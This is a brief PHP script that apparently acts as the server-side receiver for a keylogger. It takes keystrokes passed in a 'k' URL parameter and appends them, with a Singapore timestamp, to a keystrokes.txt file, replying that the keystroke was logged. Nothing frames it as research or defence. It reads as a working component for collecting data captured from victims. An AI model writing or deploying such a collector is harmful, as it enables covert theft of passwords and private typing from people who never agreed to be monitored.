<?php
date_default_timezone_set('Asia/Singapore');

if (isset($_GET['k'])) {
    $keystrokes = $_GET['k'];
    $logFile = __DIR__ . "/keystrokes.txt";  // Ensure the path is correct
    $timestamp = date('Y-m-d H:i:s');  // Get current date and time

    // Create a formatted string with the timestamp and keystrokes
    $logData = $timestamp . " - " . $keystrokes . PHP_EOL;

    if (file_put_contents($logFile, $logData, FILE_APPEND | LOCK_EX) === false) {
        echo "Failed to write to file.";
    } else {
        echo "Keystroke logged successfully";
    }
} else {
    echo "No keystrokes received";
}
?>
